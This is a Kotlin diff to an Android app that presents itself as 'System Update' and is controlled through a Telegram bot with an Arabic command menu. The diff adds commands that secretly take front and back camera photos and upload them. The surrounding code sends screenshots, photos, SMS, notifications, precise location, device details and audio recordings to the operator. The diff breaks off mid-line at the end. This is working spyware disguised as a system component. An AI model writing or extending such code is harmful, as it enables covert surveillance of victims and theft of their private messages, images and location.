@@ -31,6 +31,8 @@ object CommandExecutor {
             callbackData == "screen_once" -> captureOnce(ctx)
             callbackData == "screen_loop_start" -> startScreenLoop(ctx)
             callbackData == "screen_loop_stop" -> stopScreenLoop(ctx)
+            callbackData == "cam_front" -> captureCamera(ctx, true)
+            callbackData == "cam_back" -> captureCamera(ctx, false)
             callbackData == "fetch_all" -> fetchEverything(ctx)
             callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
             else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
@@ -51,6 +53,8 @@ object CommandExecutor {
             cmd == "/screen" -> captureOnce(ctx)
             cmd == "/screen_loop" -> startScreenLoop(ctx)
             cmd == "/screen_stop" -> stopScreenLoop(ctx)
+            cmd == "/cam_front" -> captureCamera(ctx, true)
+            cmd == "/cam_back" -> captureCamera(ctx, false)
             cmd == "/all" -> fetchEverything(ctx)
             cmd.startsWith("/photos") -> {
                 val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
@@ -60,9 +64,6 @@ object CommandExecutor {
         }
     }
 
-    // ────────────────────────────────────────────
-    //  MENUS
-    // ────────────────────────────────────────────
     private fun showMainMenu(ctx: Context) {
         val text = """
             🎛 *لوحة التحكم — System Update*
@@ -86,12 +87,25 @@ object CommandExecutor {
         }
     }
 
-    // ────────────────────────────────────────────
-    //  SCREEN CAPTURE
-    // ────────────────────────────────────────────
+    // ═══════════ CAMERA ═══════════
+    private fun captureCamera(ctx: Context, front: Boolean) {
+        runJob(ctx, "cam") {
+            val label = if (front) "أمامية 🤳" else "خلفية 📸"
+            TelegramApi.sendMessage("📷 *جاري التصوير من الكاميرا $label...*")
+            val file = CameraCapture.capture(ctx, front, timeoutSec = 10)
+            if (file != null && file.exists()) {
+                TelegramApi.sendPhoto(file, "📷 صورة من الكاميرا $label — ${DeviceInfo.getQuickInfo(ctx)}")
+                file.delete()
+            } else {
+                TelegramApi.sendMessage("❌ فشل التصوير — تأكد من صلاحية الكاميرا", KeyboardBuilder.backToMenu())
+            }
+        }
+    }
+
+    // ═══════════ SCREEN CAPTURE ═══════════
     private fun captureOnce(ctx: Context) {
         if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.\nأعد فتح التطبيق ووافق على الطلب.", KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير جاهزة.\nأعد فتح التطبيق ووافق على نافذة التقاط الشاشة.", KeyboardBuilder.backToMenu())
             return
         }
         runJob(ctx, "screen_once") {
@@ -100,14 +114,14 @@ object CommandExecutor {
                 TelegramApi.sendPhoto(file, "📷 لقطة شاشة — ${DeviceInfo.getQuickInfo(ctx)}")
                 file.delete()
             } else {
-                TelegramApi.sendMessage("❌ فشل التقاط الشاشة", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("❌ فشل التقاط الشاشة — أعد فتح التطبيق للموافقة من جديد", KeyboardBuilder.backToMenu())
             }
         }
     }
 
     private fun startScreenLoop(ctx: Context) {
         if (!ScreenCapture.isReady) {
-            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير ممنوحة.", KeyboardBuilder.backToMenu())
+            TelegramApi.sendMessage("⚠️ صلاحية التقاط الشاشة غير جاهزة.\nأعد فتح التطبيق ووافق على نافذة التقاط الشاشة.", KeyboardBuilder.backToMenu())
             return
         }
         if (screenLoopActive) {
@@ -123,9 +137,7 @@ object CommandExecutor {
         TelegramApi.sendMessage("📷 ⏹ تم إيقاف اللقطات المتكررة", KeyboardBuilder.mainMenu())
     }
 
-    // ────────────────────────────────────────────
-    //  PHOTOS
-    // ────────────────────────────────────────────
+    // ═══════════ PHOTOS ═══════════
     private fun fetchAllPhotos(ctx: Context) {
         runJob(ctx, "photos_all") {
             val all = MediaScanner.scanImages(ctx)
@@ -186,9 +198,7 @@ object CommandExecutor {
         )
     }
 
-    // ────────────────────────────────────────────
-    //  SMS
-    // ────────────────────────────────────────────
+    // ═══════════ SMS ═══════════
     private fun fetchAllSms(ctx: Context) {
         runJob(ctx, "sms_all") {
             val inbox = SmsReader.scanAll(ctx)
@@ -225,12 +235,10 @@ object CommandExecutor {
         }
     }
 
-    // ────────────────────────────────────────────
-    //  NOTIFICATIONS
-    // ────────────────────────────────────────────
+    // ═══════════ NOTIFICATIONS — يستخدم readNotifications (لا يحذف) ═══════════
     private fun fetchAllNotifs(ctx: Context) {
         runJob(ctx, "notifs_all") {
-            val lines = DataStore.drain(ctx, limit = 5000)
+            val lines = DataStore.readNotifications(ctx, limit = 5000)
             val notifs = lines.mapNotNull { line ->
                 try {
                     val obj = JSONObject(line)
@@ -239,7 +247,7 @@ object CommandExecutor {
             }
 
             if (notifs.isEmpty()) {
-                TelegramApi.sendMessage("🔔 لا توجد إشعارات", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("🔔 لا توجد إشعارات بعد.\nتأكد من تفعيل صلاحية الوصول للإشعارات لـ System Update.", KeyboardBuilder.backToMenu())
                 return@runJob
             }
 
@@ -269,9 +277,7 @@ object CommandExecutor {
         }
     }
 
-    // ────────────────────────────────────────────
-    //  AUDIO
-    // ────────────────────────────────────────────
+    // ═══════════ AUDIO ═══════════
     private fun startAudio(ctx: Context) {
         if (AudioRecorder.isRunning()) {
             TelegramApi.sendMessage("🎤 التسجيل شغّال بالفعل")
@@ -287,60 +293,15 @@ object CommandExecutor {
         TelegramApi.sendMessage("🎤 ⏹ تم إيقاف التسجيل", KeyboardBuilder.mainMenu())
     }
 
-    // ────────────────────────────────────────────
-    //  FETCH ALL
-    // ────────────────────────────────────────────
+    // ═══════════ FETCH ALL ═══════════
     private fun fetchEverything(ctx: Context) {
         runJob(ctx, "all") {
             TelegramApi.sendMessage("🚀 *بدأ الجلب الشامل*\n\n0️⃣ معلومات الجهاز...")
             Thread.sleep(500)
-            try {
-                val info = DeviceInfo.getFullInfo(ctx)
-                TelegramApi.sendMessage(info)
-            } catch (_: Exception) {}
+            try { TelegramApi.sendMessage(DeviceInfo.getFullInfo(ctx)) } catch (_: Exception) {}
 
             Thread.sleep(500)
             TelegramApi.sendMessage("📍 *الموقع...*")
             try {
                 val loc = LocationHelper.getPreciseLocation(ctx)
-                val locText = LocationHelper.formatLocation(ctx, loc)
-                TelegramApi.sendMessage(locText)
-            } catch (_: Exception) {}
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("1️⃣ *صور...*")
-            val photos = MediaScanner.scanImages(ctx)
-            sendPhotosList(ctx, photos, "📸 الصور")
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("2️⃣ *SMS...*")
-            fetchAllSms(ctx)
-
-            Thread.sleep(500)
-            TelegramApi.sendMessage("3️⃣ *إشعارات...*")
-            fetchAllNotifs(ctx)
-
-            TelegramApi.sendMessage("✅ *اكتمل الجلب الشامل*", KeyboardBuilder.mainMenu())
-        }
-    }
-
-    // ────────────────────────────────────────────
-    //  JOB MANAGEMENT
-    // ────────────────────────────────────────────
-    private fun stopJob(ctx: Context, jobId: String) {
-        runningJobs[jobId] = false
-        runningJobs.remove(jobId)
-        TelegramApi.sendMessage("🛑 تم إيقاف العملية", KeyboardBuilder.mainMenu())
-    }
-
-    private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
-        Thread {
-            try {
-                block()
-            } catch (e: Exception) {
-                Log.e("CmdExec", "job $jobName err: ${e.message}")
-                TelegramApi.sendMessage("❌ خطأ في $jobName: ${e.message}")
-            }
-        }.start()
-    }
-}
+                Telegram
